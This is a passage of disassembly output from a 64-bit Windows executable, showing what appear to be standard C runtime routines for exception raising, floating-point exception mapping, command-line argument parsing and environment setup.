   140004886:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000488b:	48 85 db             	test   %rbx,%rbx
   14000488e:	74 22                	je     0x1400048b2
   140004890:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004895:	48 8b cb             	mov    %rbx,%rcx
   140004898:	ff 15 b2 b8 00 00    	call   *0xb8b2(%rip)        # 0x140010150
   14000489e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400048a3:	f6 03 08             	testb  $0x8,(%rbx)
   1400048a6:	75 05                	jne    0x1400048ad
   1400048a8:	48 85 c0             	test   %rax,%rax
   1400048ab:	75 05                	jne    0x1400048b2
   1400048ad:	bf 00 40 99 01       	mov    $0x1994000,%edi
   1400048b2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400048b7:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400048bc:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1400048c1:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400048c6:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   1400048cb:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400048d0:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400048d5:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1400048d9:	ff 15 69 b8 00 00    	call   *0xb869(%rip)        # 0x140010148
   1400048df:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400048e4:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   1400048e9:	48 83 c4 50          	add    $0x50,%rsp
   1400048ed:	5f                   	pop    %rdi
   1400048ee:	c3                   	ret
   1400048ef:	cc                   	int3
   1400048f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048f5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400048fa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400048ff:	57                   	push   %rdi
   140004900:	48 83 ec 20          	sub    $0x20,%rsp
   140004904:	48 8b f2             	mov    %rdx,%rsi
   140004907:	8b f9                	mov    %ecx,%edi
   140004909:	e8 fe 1b 00 00       	call   0x14000650c
   14000490e:	45 33 c9             	xor    %r9d,%r9d
   140004911:	48 8b d8             	mov    %rax,%rbx
   140004914:	48 85 c0             	test   %rax,%rax
   140004917:	74 1f                	je     0x140004938
   140004919:	48 8b 08             	mov    (%rax),%rcx
   14000491c:	48 8b c1             	mov    %rcx,%rax
   14000491f:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   140004926:	49 3b c8             	cmp    %r8,%rcx
   140004929:	74 0d                	je     0x140004938
   14000492b:	39 38                	cmp    %edi,(%rax)
   14000492d:	74 20                	je     0x14000494f
   14000492f:	48 83 c0 10          	add    $0x10,%rax
   140004933:	49 3b c0             	cmp    %r8,%rax
   140004936:	75 f3                	jne    0x14000492b
   140004938:	33 c0                	xor    %eax,%eax
   14000493a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000493f:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004944:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004949:	48 83 c4 20          	add    $0x20,%rsp
   14000494d:	5f                   	pop    %rdi
   14000494e:	c3                   	ret
   14000494f:	48 85 c0             	test   %rax,%rax
   140004952:	74 e4                	je     0x140004938
   140004954:	4c 8b 40 08          	mov    0x8(%rax),%r8
   140004958:	4d 85 c0             	test   %r8,%r8
   14000495b:	74 db                	je     0x140004938
   14000495d:	49 83 f8 05          	cmp    $0x5,%r8
   140004961:	75 0a                	jne    0x14000496d
   140004963:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140004967:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   14000496b:	eb cd                	jmp    0x14000493a
   14000496d:	49 83 f8 01          	cmp    $0x1,%r8
   140004971:	75 05                	jne    0x140004978
   140004973:	83 c8 ff             	or     $0xffffffff,%eax
   140004976:	eb c2                	jmp    0x14000493a
   140004978:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   14000497c:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   140004980:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   140004984:	0f 85 c4 00 00 00    	jne    0x140004a4e
   14000498a:	48 83 c1 30          	add    $0x30,%rcx
   14000498e:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   140004995:	eb 08                	jmp    0x14000499f
   140004997:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   14000499b:	48 83 c1 10          	add    $0x10,%rcx
   14000499f:	48 3b ca             	cmp    %rdx,%rcx
   1400049a2:	75 f3                	jne    0x140004997
   1400049a4:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   1400049aa:	8b 7b 10             	mov    0x10(%rbx),%edi
   1400049ad:	74 7a                	je     0x140004a29
   1400049af:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   1400049b5:	74 6b                	je     0x140004a22
   1400049b7:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   1400049bd:	74 5c                	je     0x140004a1b
   1400049bf:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   1400049c5:	74 4d                	je     0x140004a14
   1400049c7:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   1400049cd:	74 3e                	je     0x140004a0d
   1400049cf:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   1400049d5:	74 2f                	je     0x140004a06
   1400049d7:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   1400049dd:	74 20                	je     0x1400049ff
   1400049df:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   1400049e5:	74 11                	je     0x1400049f8
   1400049e7:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   1400049ed:	8b d7                	mov    %edi,%edx
   1400049ef:	75 40                	jne    0x140004a31
   1400049f1:	ba 8d 00 00 00       	mov    $0x8d,%edx
   1400049f6:	eb 36                	jmp    0x140004a2e
   1400049f8:	ba 8e 00 00 00       	mov    $0x8e,%edx
   1400049fd:	eb 2f                	jmp    0x140004a2e
   1400049ff:	ba 85 00 00 00       	mov    $0x85,%edx
   140004a04:	eb 28                	jmp    0x140004a2e
   140004a06:	ba 8a 00 00 00       	mov    $0x8a,%edx
   140004a0b:	eb 21                	jmp    0x140004a2e
   140004a0d:	ba 84 00 00 00       	mov    $0x84,%edx
   140004a12:	eb 1a                	jmp    0x140004a2e
   140004a14:	ba 81 00 00 00       	mov    $0x81,%edx
   140004a19:	eb 13                	jmp    0x140004a2e
   140004a1b:	ba 86 00 00 00       	mov    $0x86,%edx
   140004a20:	eb 0c                	jmp    0x140004a2e
   140004a22:	ba 83 00 00 00       	mov    $0x83,%edx
   140004a27:	eb 05                	jmp    0x140004a2e
   140004a29:	ba 82 00 00 00       	mov    $0x82,%edx
   140004a2e:	89 53 10             	mov    %edx,0x10(%rbx)
   140004a31:	49 ba 70 33 d3 30 4f 	movabs $0x8b9c1f4f30d33370,%r10
   140004a38:	1f 9c 8b 
   140004a3b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004a40:	49 8b c0             	mov    %r8,%rax
   140004a43:	ff 15 77 b8 00 00    	call   *0xb877(%rip)        # 0x1400102c0
   140004a49:	89 7b 10             	mov    %edi,0x10(%rbx)
   140004a4c:	eb 1a                	jmp    0x140004a68
   140004a4e:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140004a52:	49 ba 70 73 d7 50 49 	movabs $0xc6c1864950d77370,%r10
   140004a59:	86 c1 c6 
   140004a5c:	8b 48 04             	mov    0x4(%rax),%ecx
   140004a5f:	49 8b c0             	mov    %r8,%rax
   140004a62:	ff 15 58 b8 00 00    	call   *0xb858(%rip)        # 0x1400102c0
   140004a68:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   140004a6c:	e9 02 ff ff ff       	jmp    0x140004973
   140004a71:	cc                   	int3
   140004a72:	cc                   	int3
   140004a73:	cc                   	int3
   140004a74:	8b 05 86 67 01 00    	mov    0x16786(%rip),%eax        # 0x14001b200
   140004a7a:	c3                   	ret
   140004a7b:	cc                   	int3
   140004a7c:	89 0d 7e 67 01 00    	mov    %ecx,0x1677e(%rip)        # 0x14001b200
   140004a82:	c3                   	ret
   140004a83:	cc                   	int3
   140004a84:	48 8b 05 75 55 01 00 	mov    0x15575(%rip),%rax        # 0x14001a000
   140004a8b:	48 8b 15 76 67 01 00 	mov    0x16776(%rip),%rdx        # 0x14001b208
   140004a92:	8b c8                	mov    %eax,%ecx
   140004a94:	48 33 d0             	xor    %rax,%rdx
   140004a97:	83 e1 3f             	and    $0x3f,%ecx
   140004a9a:	48 d3 ca             	ror    %cl,%rdx
   140004a9d:	48 85 d2             	test   %rdx,%rdx
   140004aa0:	0f 95 c0             	setne  %al
   140004aa3:	c3                   	ret
   140004aa4:	48 89 0d 5d 67 01 00 	mov    %rcx,0x1675d(%rip)        # 0x14001b208
   140004aab:	c3                   	ret
   140004aac:	48 8b 05 4d 55 01 00 	mov    0x1554d(%rip),%rax        # 0x14001a000
   140004ab3:	4c 8b c1             	mov    %rcx,%r8
   140004ab6:	48 8b 15 4b 67 01 00 	mov    0x1674b(%rip),%rdx        # 0x14001b208
   140004abd:	8b c8                	mov    %eax,%ecx
   140004abf:	83 e1 3f             	and    $0x3f,%ecx
   140004ac2:	48 33 d0             	xor    %rax,%rdx
   140004ac5:	48 d3 ca             	ror    %cl,%rdx
   140004ac8:	48 85 d2             	test   %rdx,%rdx
   140004acb:	75 03                	jne    0x140004ad0
   140004acd:	33 c0                	xor    %eax,%eax
   140004acf:	c3                   	ret
   140004ad0:	49 ba 70 71 54 58 e6 	movabs $0xd88807e658547170,%r10
   140004ad7:	07 88 d8 
   140004ada:	49 8b c8             	mov    %r8,%rcx
   140004add:	48 8b c2             	mov    %rdx,%rax
   140004ae0:	48 ff 25 d9 b7 00 00 	rex.W jmp *0xb7d9(%rip)        # 0x1400102c0
   140004ae7:	cc                   	int3
   140004ae8:	4c 8b 05 11 55 01 00 	mov    0x15511(%rip),%r8        # 0x14001a000
   140004aef:	4c 8b c9             	mov    %rcx,%r9
   140004af2:	41 8b d0             	mov    %r8d,%edx
   140004af5:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004afa:	83 e2 3f             	and    $0x3f,%edx
   140004afd:	2b ca                	sub    %edx,%ecx
   140004aff:	49 d3 c9             	ror    %cl,%r9
   140004b02:	4d 33 c8             	xor    %r8,%r9
   140004b05:	4c 89 0d fc 66 01 00 	mov    %r9,0x166fc(%rip)        # 0x14001b208
   140004b0c:	c3                   	ret
   140004b0d:	cc                   	int3
   140004b0e:	cc                   	int3
   140004b0f:	cc                   	int3
   140004b10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b15:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004b1a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004b1f:	57                   	push   %rdi
   140004b20:	41 54                	push   %r12
   140004b22:	41 55                	push   %r13
   140004b24:	41 56                	push   %r14
   140004b26:	41 57                	push   %r15
   140004b28:	48 83 ec 20          	sub    $0x20,%rsp
   140004b2c:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   140004b31:	4d 8b e9             	mov    %r9,%r13
   140004b34:	49 8b d8             	mov    %r8,%rbx
   140004b37:	4c 8b f2             	mov    %rdx,%r14
   140004b3a:	48 8b f9             	mov    %rcx,%rdi
   140004b3d:	49 83 24 24 00       	andq   $0x0,(%r12)
   140004b42:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140004b49:	48 85 d2             	test   %rdx,%rdx
   140004b4c:	74 07                	je     0x140004b55
   140004b4e:	48 89 1a             	mov    %rbx,(%rdx)
   140004b51:	49 83 c6 08          	add    $0x8,%r14
   140004b55:	40 32 ed             	xor    %bpl,%bpl
   140004b58:	80 3f 22             	cmpb   $0x22,(%rdi)
   140004b5b:	4c 8b ff             	mov    %rdi,%r15
   140004b5e:	75 0f                	jne    0x140004b6f
   140004b60:	40 84 ed             	test   %bpl,%bpl
   140004b63:	40 b6 22             	mov    $0x22,%sil
   140004b66:	40 0f 94 c5          	sete   %bpl
   140004b6a:	48 ff c7             	inc    %rdi
   140004b6d:	eb 3a                	jmp    0x140004ba9
   140004b6f:	49 ff 04 24          	incq   (%r12)
   140004b73:	48 85 db             	test   %rbx,%rbx
   140004b76:	74 07                	je     0x140004b7f
   140004b78:	8a 07                	mov    (%rdi),%al
   140004b7a:	88 03                	mov    %al,(%rbx)
   140004b7c:	48 ff c3             	inc    %rbx
   140004b7f:	0f be 37             	movsbl (%rdi),%esi
   140004b82:	48 ff c7             	inc    %rdi
   140004b85:	8b ce                	mov    %esi,%ecx
   140004b87:	e8 bc 39 00 00       	call   0x140008548
   140004b8c:	85 c0                	test   %eax,%eax
   140004b8e:	74 14                	je     0x140004ba4
   140004b90:	49 ff 04 24          	incq   (%r12)
   140004b94:	48 85 db             	test   %rbx,%rbx
   140004b97:	74 07                	je     0x140004ba0
   140004b99:	8a 07                	mov    (%rdi),%al
   140004b9b:	88 03                	mov    %al,(%rbx)
   140004b9d:	48 ff c3             	inc    %rbx
   140004ba0:	49 8d 7f 02          	lea    0x2(%r15),%rdi
   140004ba4:	40 84 f6             	test   %sil,%sil
   140004ba7:	74 1c                	je     0x140004bc5
   140004ba9:	40 84 ed             	test   %bpl,%bpl
   140004bac:	75 aa                	jne    0x140004b58
   140004bae:	40 80 fe 20          	cmp    $0x20,%sil
   140004bb2:	74 06                	je     0x140004bba
   140004bb4:	40 80 fe 09          	cmp    $0x9,%sil
   140004bb8:	75 9e                	jne    0x140004b58
   140004bba:	48 85 db             	test   %rbx,%rbx
   140004bbd:	74 09                	je     0x140004bc8
   140004bbf:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   140004bc3:	eb 03                	jmp    0x140004bc8
   140004bc5:	48 ff cf             	dec    %rdi
   140004bc8:	40 32 f6             	xor    %sil,%sil
   140004bcb:	8a 07                	mov    (%rdi),%al
   140004bcd:	84 c0                	test   %al,%al
   140004bcf:	0f 84 d6 00 00 00    	je     0x140004cab
   140004bd5:	3c 20                	cmp    $0x20,%al
   140004bd7:	74 04                	je     0x140004bdd
   140004bd9:	3c 09                	cmp    $0x9,%al
   140004bdb:	75 07                	jne    0x140004be4
   140004bdd:	48 ff c7             	inc    %rdi
   140004be0:	8a 07                	mov    (%rdi),%al
   140004be2:	eb f1                	jmp    0x140004bd5
   140004be4:	84 c0                	test   %al,%al
   140004be6:	0f 84 bf 00 00 00    	je     0x140004cab
   140004bec:	4d 85 f6             	test   %r14,%r14
   140004bef:	74 07                	je     0x140004bf8
   140004bf1:	49 89 1e             	mov    %rbx,(%r14)
   140004bf4:	49 83 c6 08          	add    $0x8,%r14
   140004bf8:	49 ff 45 00          	incq   0x0(%r13)
   140004bfc:	ba 01 00 00 00       	mov    $0x1,%edx
   140004c01:	33 c0                	xor    %eax,%eax
   140004c03:	eb 05                	jmp    0x140004c0a
   140004c05:	48 ff c7             	inc    %rdi
   140004c08:	ff c0                	inc    %eax
   140004c0a:	8a 0f                	mov    (%rdi),%cl
   140004c0c:	80 f9 5c             	cmp    $0x5c,%cl
   140004c0f:	74 f4                	je     0x140004c05
   140004c11:	80 f9 22             	cmp    $0x22,%cl
   140004c14:	75 31                	jne    0x140004c47
   140004c16:	84 c2                	test   %al,%dl
   140004c18:	75 18                	jne    0x140004c32
   140004c1a:	40 84 f6             	test   %sil,%sil
   140004c1d:	74 0a                	je     0x140004c29
   140004c1f:	38 4f 01             	cmp    %cl,0x1(%rdi)
   140004c22:	75 05                	jne    0x140004c29
   140004c24:	48 ff c7             	inc    %rdi
   140004c27:	eb 09                	jmp    0x140004c32
   140004c29:	33 d2                	xor    %edx,%edx
   140004c2b:	40 84 f6             	test   %sil,%sil
   140004c2e:	40 0f 94 c6          	sete   %sil
   140004c32:	d1 e8                	shr    $1,%eax
   140004c34:	eb 11                	jmp    0x140004c47
   140004c36:	ff c8                	dec    %eax
   140004c38:	48 85 db             	test   %rbx,%rbx
   140004c3b:	74 06                	je     0x140004c43
   140004c3d:	c6 03 5c             	movb   $0x5c,(%rbx)
   140004c40:	48 ff c3             	inc    %rbx
   140004c43:	49 ff 04 24          	incq   (%r12)
   140004c47:	85 c0                	test   %eax,%eax
   140004c49:	75 eb                	jne    0x140004c36
   140004c4b:	8a 07                	mov    (%rdi),%al
   140004c4d:	84 c0                	test   %al,%al
   140004c4f:	74 46                	je     0x140004c97
   140004c51:	40 84 f6             	test   %sil,%sil
   140004c54:	75 08                	jne    0x140004c5e
   140004c56:	3c 20                	cmp    $0x20,%al
   140004c58:	74 3d                	je     0x140004c97
   140004c5a:	3c 09                	cmp    $0x9,%al
   140004c5c:	74 39                	je     0x140004c97
   140004c5e:	85 d2                	test   %edx,%edx
   140004c60:	74 2d                	je     0x140004c8f
   140004c62:	48 85 db             	test   %rbx,%rbx
   140004c65:	74 05                	je     0x140004c6c
   140004c67:	88 03                	mov    %al,(%rbx)
   140004c69:	48 ff c3             	inc    %rbx
   140004c6c:	0f be 0f             	movsbl (%rdi),%ecx
   140004c6f:	e8 d4 38 00 00       	call   0x140008548
   140004c74:	85 c0                	test   %eax,%eax
   140004c76:	74 13                	je     0x140004c8b
   140004c78:	49 ff 04 24          	incq   (%r12)
   140004c7c:	48 ff c7             	inc    %rdi
   140004c7f:	48 85 db             	test   %rbx,%rbx
   140004c82:	74 07                	je     0x140004c8b
   140004c84:	8a 07                	mov    (%rdi),%al
   140004c86:	88 03                	mov    %al,(%rbx)
   140004c88:	48 ff c3             	inc    %rbx
   140004c8b:	49 ff 04 24          	incq   (%r12)
   140004c8f:	48 ff c7             	inc    %rdi
   140004c92:	e9 65 ff ff ff       	jmp    0x140004bfc
   140004c97:	48 85 db             	test   %rbx,%rbx
   140004c9a:	74 06                	je     0x140004ca2
   140004c9c:	c6 03 00             	movb   $0x0,(%rbx)
   140004c9f:	48 ff c3             	inc    %rbx
   140004ca2:	49 ff 04 24          	incq   (%r12)
   140004ca6:	e9 20 ff ff ff       	jmp    0x140004bcb
   140004cab:	4d 85 f6             	test   %r14,%r14
   140004cae:	74 04                	je     0x140004cb4
   140004cb0:	49 83 26 00          	andq   $0x0,(%r14)
   140004cb4:	49 ff 45 00          	incq   0x0(%r13)
   140004cb8:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004cbd:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004cc2:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004cc7:	48 83 c4 20          	add    $0x20,%rsp
   140004ccb:	41 5f                	pop    %r15
   140004ccd:	41 5e                	pop    %r14
   140004ccf:	41 5d                	pop    %r13
   140004cd1:	41 5c                	pop    %r12
   140004cd3:	5f                   	pop    %rdi
   140004cd4:	c3                   	ret
   140004cd5:	cc                   	int3
   140004cd6:	cc                   	int3
   140004cd7:	cc                   	int3
   140004cd8:	40 53                	rex push %rbx
   140004cda:	48 83 ec 20          	sub    $0x20,%rsp
   140004cde:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140004ce5:	ff ff 1f 
   140004ce8:	4c 8b ca             	mov    %rdx,%r9
   140004ceb:	48 3b c8             	cmp    %rax,%rcx
   140004cee:	73 3d                	jae    0x140004d2d
   140004cf0:	33 d2                	xor    %edx,%edx
   140004cf2:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140004cf6:	49 f7 f0             	div    %r8
   140004cf9:	4c 3b c8             	cmp    %rax,%r9
   140004cfc:	73 2f                	jae    0x140004d2d
   140004cfe:	48 c1 e1 03          	shl    $0x3,%rcx
   140004d02:	4d 0f af c8          	imul   %r8,%r9
   140004d06:	48 8b c1             	mov    %rcx,%rax
   140004d09:	48 f7 d0             	not    %rax
   140004d0c:	49 3b c1             	cmp    %r9,%rax
   140004d0f:	76 1c                	jbe    0x140004d2d
   140004d11:	49 03 c9             	add    %r9,%rcx
   140004d14:	ba 01 00 00 00       	mov    $0x1,%edx
   140004d19:	e8 b6 1e 00 00       	call   0x140006bd4
   140004d1e:	33 c9                	xor    %ecx,%ecx
   140004d20:	48 8b d8             	mov    %rax,%rbx
   140004d23:	e8 24 1f 00 00       	call   0x140006c4c
   140004d28:	48 8b c3             	mov    %rbx,%rax
   140004d2b:	eb 02                	jmp    0x140004d2f
   140004d2d:	33 c0                	xor    %eax,%eax
   140004d2f:	48 83 c4 20          	add    $0x20,%rsp
   140004d33:	5b                   	pop    %rbx
   140004d34:	c3                   	ret
   140004d35:	cc                   	int3
   140004d36:	cc                   	int3
   140004d37:	cc                   	int3
   140004d38:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004d3d:	55                   	push   %rbp
   140004d3e:	56                   	push   %rsi
   140004d3f:	57                   	push   %rdi
   140004d40:	41 56                	push   %r14
   140004d42:	41 57                	push   %r15
   140004d44:	48 8b ec             	mov    %rsp,%rbp
   140004d47:	48 83 ec 30          	sub    $0x30,%rsp
   140004d4b:	33 ff                	xor    %edi,%edi
   140004d4d:	44 8b f1             	mov    %ecx,%r14d
   140004d50:	85 c9                	test   %ecx,%ecx
   140004d52:	0f 84 53 01 00 00    	je     0x140004eab
   140004d58:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140004d5b:	83 f8 01             	cmp    $0x1,%eax
   140004d5e:	76 16                	jbe    0x140004d76
   140004d60:	e8 4f 1e 00 00       	call   0x140006bb4
   140004d65:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140004d68:	89 18                	mov    %ebx,(%rax)
   140004d6a:	e8 09 1d 00 00       	call   0x140006a78
   140004d6f:	8b fb                	mov    %ebx,%edi
   140004d71:	e9 35 01 00 00       	jmp    0x140004eab
   140004d76:	e8 1d 34 00 00       	call   0x140008198
   140004d7b:	48 8d 1d 8e 64 01 00 	lea    0x1648e(%rip),%rbx        # 0x14001b210
   140004d82:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140004d88:	48 8b d3             	mov    %rbx,%rdx
   140004d8b:	33 c9                	xor    %ecx,%ecx
   140004d8d:	e8 ea 2a 00 00       	call   0x14000787c
   140004d92:	48 8b 35 d7 65 01 00 	mov    0x165d7(%rip),%rsi        # 0x14001b370
   140004d99:	48 89 1d b0 65 01 00 	mov    %rbx,0x165b0(%rip)        # 0x14001b350
   140004da0:	48 85 f6             	test   %rsi,%rsi
   140004da3:	74 05                	je     0x140004daa
   140004da5:	40 38 3e             	cmp    %dil,(%rsi)
   140004da8:	75 03                	jne    0x140004dad
   140004daa:	48 8b f3             	mov    %rbx,%rsi
   140004dad:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004db1:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   140004db5:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140004db9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004dbe:	45 33 c0             	xor    %r8d,%r8d
   140004dc1:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   140004dc5:	33 d2                	xor    %edx,%edx
   140004dc7:	48 8b ce             	mov    %rsi,%rcx
   140004dca:	e8 41 fd ff ff       	call   0x140004b10
   140004dcf:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   140004dd3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004dd9:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140004ddd:	49 8b cf             	mov    %r15,%rcx
   140004de0:	e8 f3 fe ff ff       	call   0x140004cd8
   140004de5:	48 8b d8             	mov    %rax,%rbx
   140004de8:	48 85 c0             	test   %rax,%rax
   140004deb:	75 18                	jne    0x140004e05
   140004ded:	e8 c2 1d 00 00       	call   0x140006bb4
   140004df2:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140004df7:	33 c9                	xor    %ecx,%ecx
   140004df9:	89 18                	mov    %ebx,(%rax)
   140004dfb:	e8 4c 1e 00 00       	call   0x140006c4c
   140004e00:	e9 6a ff ff ff       	jmp    0x140004d6f
   140004e05:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   140004e09:	48 8b d3             	mov    %rbx,%rdx
   140004e0c:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004e10:	48 8b ce             	mov    %rsi,%rcx
   140004e13:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140004e17:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004e1c:	e8 ef fc ff ff       	call   0x140004b10
   140004e21:	41 83 fe 01          	cmp    $0x1,%r14d
   140004e25:	75 16                	jne    0x140004e3d
   140004e27:	8b 45 40             	mov    0x40(%rbp),%eax
   140004e2a:	ff c8                	dec    %eax
   140004e2c:	48 89 1d 2d 65 01 00 	mov    %rbx,0x1652d(%rip)        # 0x14001b360
   140004e33:	89 05 1f 65 01 00    	mov    %eax,0x1651f(%rip)        # 0x14001b358
   140004e39:	33 c9                	xor    %ecx,%ecx
   140004e3b:	eb 69                	jmp    0x140004ea6
   140004e3d:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   140004e41:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004e45:	48 8b cb             	mov    %rbx,%rcx
   140004e48:	e8 0b 29 00 00       	call   0x140007758
   140004e4d:	8b f0                	mov    %eax,%esi
   140004e4f:	85 c0                	test   %eax,%eax
   140004e51:	74 19                	je     0x140004e6c
   140004e53:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140004e57:	e8 f0 1d 00 00       	call   0x140006c4c
   140004e5c:	48 8b cb             	mov    %rbx,%rcx
   140004e5f:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004e63:	e8 e4 1d 00 00       	call   0x140006c4c
   140004e68:	8b fe                	mov    %esi,%edi
   140004e6a:	eb 3f                	jmp    0x140004eab
   140004e6c:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140004e70:	48 8b cf             	mov    %rdi,%rcx
   140004e73:	48 8b c2             	mov    %rdx,%rax
   140004e76:	48 39 3a             	cmp    %rdi,(%rdx)
   140004e79:	74 0c                	je     0x140004e87
   140004e7b:	48 8d 40 08          	lea    0x8(%rax),%rax
   140004e7f:	48 ff c1             	inc    %rcx
   140004e82:	48 39 38             	cmp    %rdi,(%rax)
   140004e85:	75 f4                	jne    0x140004e7b
   140004e87:	89 0d cb 64 01 00    	mov    %ecx,0x164cb(%rip)        # 0x14001b358
   140004e8d:	33 c9                	xor    %ecx,%ecx
   140004e8f:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004e93:	48 89 15 c6 64 01 00 	mov    %rdx,0x164c6(%rip)        # 0x14001b360
   140004e9a:	e8 ad 1d 00 00       	call   0x140006c4c
   140004e9f:	48 8b cb             	mov    %rbx,%rcx
   140004ea2:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004ea6:	e8 a1 1d 00 00       	call   0x140006c4c
   140004eab:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004eb0:	8b c7                	mov    %edi,%eax
   140004eb2:	48 83 c4 30          	add    $0x30,%rsp
   140004eb6:	41 5f                	pop    %r15
   140004eb8:	41 5e                	pop    %r14
   140004eba:	5f                   	pop    %rdi
   140004ebb:	5e                   	pop    %rsi
   140004ebc:	5d                   	pop    %rbp
   140004ebd:	c3                   	ret
   140004ebe:	cc                   	int3
   140004ebf:	cc                   	int3
   140004ec0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ec5:	57                   	push   %rdi
   140004ec6:	48 83 ec 20          	sub    $0x20,%rsp
   140004eca:	33 ff                	xor    %edi,%edi
   140004ecc:	48 39 3d 45 64 01 00 	cmp    %rdi,0x16445(%rip)        # 0x14001b318
   140004ed3:	74 04                	je     0x140004ed9
   140004ed5:	33 c0                	xor    %eax,%eax
   140004ed7:	eb 4f                	jmp    0x140004f28
   140004ed9:	e8 ba 32 00 00       	call   0x140008198
   140004ede:	e8 e9 37 00 00       	call   0x1400086cc
   140004ee3:	48 8b d8             	mov    %rax,%rbx
   140004ee6:	48 85 c0             	test   %rax,%rax
   140004ee9:	75 0c                	jne    0x140004ef7
   140004eeb:	33 c9                	xor    %ecx,%ecx
   140004eed:	e8 5a 1d 00 00       	call   0x140006c4c
   140004ef2:	83 c8 ff             	or     $0xffffffff,%eax
   140004ef5:	eb 31                	jmp    0x140004f28
   140004ef7:	48 8b cb             	mov    %rbx,%rcx
   140004efa:	e8 35 00 00 00       	call   0x140004f34
   140004eff:	48 85 c0             	test   %rax,%rax
   140004f02:	75 05                	jne    0x140004f09
   140004f04:	83 cf ff             	or     $0xffffffff,%edi
   140004f07:	eb 0e                	jmp    0x140004f17
   140004f09:	48 89 05 20 64 01 00 	mov    %rax,0x16420(%rip)        # 0x14001b330
   140004f10:	48 89 05 01 64 01 00 	mov    %rax,0x16401(%rip)        # 0x14001b318
   140004f17:	33 c9                	xor    %ecx,%ecx
   140004f19:	e8 2e 1d 00 00       	call   0x140006c4c
   140004f1e:	48 8b cb             	mov    %rbx,%rcx
   140004f21:	e8 26 1d 00 00       	call   0x140006c4c
   140004f26:	8b c7                	mov    %edi,%eax
   140004f28:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f2d:	48 83 c4 20          	add    $0x20,%rsp
   140004f31:	5f                   	pop    %rdi
   140004f32:	c3                   	ret
   140004f33:	cc                   	int3
   140004f34:	48 8b c4             	mov    %rsp,%rax
   140004f37:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004f3b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004f3f:	48 89 70 18          	mov    %rsi,0x18(%rax)
